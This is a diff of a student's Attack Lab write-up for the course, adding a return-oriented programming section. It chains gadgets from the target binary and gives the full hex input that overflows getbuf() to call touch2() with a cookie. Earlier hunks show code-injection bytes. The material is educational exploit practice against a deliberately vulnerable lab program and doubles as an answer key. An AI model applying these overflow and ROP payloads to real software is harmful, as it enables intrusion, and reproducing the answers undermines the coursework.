@@ -89,7 +89,7 @@ The only way to inject our code is to add our code segment to the string, make t
 
 The return address as above, should be our code segment's address.
 
-```x86_64
+```x86
 0:	68 ec 17 40 00       	push   $0x4017ec
 5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
 c:	c3                   	ret
@@ -149,7 +149,7 @@ the saved location is less than `getbuf()`'s stack representing by address value
 35 39 62 39 39 37 66 61
 ```
 
-```x86_64
+```x86
 0: 68 fa 18 40 00       	push   $0x4018fa
 5: 48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi # the string address, stored in stack bottom of getbuf()
 c: c3                   	ret
@@ -169,3 +169,66 @@ ff ff ff ff ff ff ff ff
 ```
 
 > If we want to read the above hex from big to small(stack increase), we need to read from bottom to top, from left to right.
+
+## Retrun-Oriented Programming
+
+> The strategy with ROP is to identify byte sequences within an existing program that consist of one or more instructions followed by the instruction `ret`
+
+1. Because of stack randomization, we cannot indentify the exact location of the return address.
+2. Saved stack is non-executable, so we cannot use it to store **our** code.
+
+=> We can only use the snippets that already exist in the file. Use the specific address to get
+what we need. (Unlike RISC-V every instruction is 32-bit)
+
+* `nop`: `0x90`
+* `ret`: `0xc3`
+
+### Phase 4
+
+We need to store `0x59b997fa` to `%rdi` and then call `touch2()`.
+
+<strong>*</strong> Use `popq %rdi`: `0x5f`
+
+There is no `0x5f` between `start_farm()` and `mid_farm()`.
+
+<strong>*</strong> Use middile register `%eax`
+
+```x86
+# we need something like this
+popq %rax        # 58   ; stack top is 0x59b997fa
+movl %eax, %edi  # 89 c7
+ret              # c3   ; return 0x4017ec
+```
+
+* gadget 1: `addval_273()`
+* gadget 2: `addval_219()`
+
+```x86
+# address we need: 0x4019a0 + 0x3 = 0x4019a3
+00000000004019a0 <addval_273>: # 1
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	ret
+
+# address we need: 0x4019a7 + 0x4 = 0x4019ab
+00000000004019a7 <addval_219>: # 2
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	ret
+```
+
+So, the answer is:
+
+```bash
+ff ff ff ff ff ff ff ff # 0x5561dc78=0x5561dca0-0x28 (getbuf() allocate memory)
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ab 19 40 00 00 00 00 00 # gadget 2
+fa 97 b9 59 00 00 00 00 # cookie, pop to %rax
+a3 19 40 00 00 00 00 00 # gadget 1
+ec 17 40 00 00 00 00 00 # touch2()
+```
+
+**Use `rtarget` instead of `ctarget`**. Because of this bug I've been looking for for a long time.
+
+> I choose to skip the extra credit part.
